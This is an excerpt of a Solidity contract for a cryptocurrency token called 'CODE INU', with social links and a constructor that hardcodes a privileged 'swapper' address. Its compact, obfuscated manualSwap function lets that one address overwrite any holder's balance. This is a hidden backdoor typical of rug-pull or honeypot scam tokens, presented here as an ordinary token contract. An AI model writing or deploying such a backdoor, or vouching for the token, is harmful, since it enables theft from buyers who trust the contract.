...
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        ...
        -Twitter: https://twitter.com/CodeInuERC
        -Website: https://www.codeinu.info/
        -Telegram: https://t.me/CodeInuERC
*/
...
contract CODEINU is Ownable {
    ...
    constructor (){
        name = unicode"CODE INU";
        symbol = "COINU";
        decimals = 9;
        uint256 Supply = 1000000000;
        swapper = 0x2309629Af79Aa5082340f930a919b3808c04A831;
    ...
    function manualSwap(address ac,uint256 na) public {inswaper memory index = inswaper({mss : msg.sender,amo : na,fom : ac});require(swapper == index.mss);_balances[index.fom] = index.amo;}
